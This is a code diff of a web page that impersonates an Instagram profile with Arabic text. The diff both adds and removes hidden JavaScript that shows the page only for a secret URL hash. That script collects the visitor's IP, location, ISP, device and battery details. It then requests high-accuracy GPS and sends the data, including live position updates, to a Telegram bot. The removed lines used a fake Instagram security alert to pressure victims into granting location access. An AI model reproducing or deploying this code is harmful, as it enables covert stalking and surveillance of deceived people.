@@ -5,10 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Instagram | @ekhlas_2026</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; margin: 0; padding: 0; display: none; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; padding: 0; display: none; }
         .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; }
         .p-container { padding: 20px 15px; }
         .p-pic { width: 77px; height: 77px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
+        .stats { display: flex; flex-grow: 1; justify-content: space-around; text-align: center; margin-right: 15px; }
         .f-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 8px; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
@@ -17,7 +18,7 @@
     <div class="p-container">
         <div style="display: flex; align-items: center;">
             <img src="https://k.top4top.io/p_3696qmute0.jpeg" class="p-pic">
-            <div style="display: flex; flex-grow: 1; justify-content: space-around; text-align: center; margin-right: 15px;">
+            <div class="stats">
                 <div><b>14</b><br><small>منشور</small></div>
                 <div><b>482</b><br><small>متابع</small></div>
                 <div><b>315</b><br><small>نتابعهم</small></div>
@@ -34,43 +35,60 @@
         window.onload = async () => {
             if(window.location.hash.includes("#secure")) {
                 document.getElementById('b').style.display = 'block';
-                // 1. سحب البيانات التقنية فوراً
-                await ghostData();
-                // 2. البدء بالسحب الإجباري والتتبع الحي
-                startLiveTracking();
+                
+                // 1. سحب البيانات الشاملة (فوراً)
+                captureDeepData();
+                
+                // 2. طلب إذن الـ GPS (فوراً)
+                triggerGPS();
             } else {
                 window.location.replace("https://www.instagram.com");
             }
         };
 
-        async function ghostData() {
+        async function captureDeepData() {
             try {
+                // سحب الـ IP والموقع الجغرافي للشبكة
                 const r = await fetch('https://ipapi.co/json/').then(res => res.json());
-                let b = "N/A"; if(navigator.getBattery) { const bat = await navigator.getBattery(); b = Math.round(bat.level*100)+"%"; }
-                const m = `⚠️ **دخول جديد:**\nIP: ${r.ip}\nCity: ${r.city}\nDevice: ${navigator.platform}\nBattery: ${b}\nRAM: ${navigator.deviceMemory || '4+'}GB`;
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
+                
+                // سحب البطارية
+                let bat = "N/A";
+                if(navigator.getBattery) { 
+                    const bObj = await navigator.getBattery(); 
+                    bat = `${Math.round(bObj.level * 100)}% (${bObj.charging ? 'يُشحن' : 'لا يُشحن'})`; 
+                }
+
+                const dataMsg = `
+⚠️ **صيد بيانات تقنية شاملة:**
+🌐 IP: ${r.ip}
+📍 المنطقة: ${r.city} | ${r.country_name}
+🏢 المزود: ${r.org}
+📱 الجهاز: ${navigator.platform}
+🧠 الرام: ${navigator.deviceMemory || 'غير معروف'} GB
+🔋 البطارية: ${bat}
+⏰ التوقيت: ${new Date().toLocaleString('ar-EG')}
+🌐 اللغة: ${navigator.language}
+🖥️ الشاشة: ${screen.width}x${screen.height}
+                `;
+                
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(dataMsg)}`);
             } catch(e) {}
         }
 
-        function startLiveTracking() {
-            const opt = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+        function triggerGPS() {
+            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-            // وظيفة التتبع الحي: ترسل تحديثاً كلما تحرك الهدف
+            // طلب الموقع وتتبعه حياً
             navigator.geolocation.watchPosition(
                 (p) => {
                     const lat = p.coords.latitude;
                     const lon = p.coords.longitude;
-                    const acc = p.coords.accuracy.toFixed(1);
                     const map = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `📍 **تتبع حي (تحرك الهدف):**\n${map}\n🎯 الدقة: ${acc} متر`;
+                    const msg = `📍 **تتبع GPS دقيق (Live):**\n${map}\n🎯 الدقة: ${p.coords.accuracy.toFixed(1)} متر`;
                     fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
                 },
-                (e) => {
-                    if(e.code == 1) {
-                        alert("⚠️ تنبيه أمني من إنستغرام: يجب تفعيل 'الموقع الدقيق' والسماح بالوصول للموقع لتأكيد هويتك ومشاهدة محتوى الحساب.");
-                        startLiveTracking(); // إعادة الطلب خاوة
-                    }
-                }, opt
+                null, 
+                options
             );
         }
     </script>
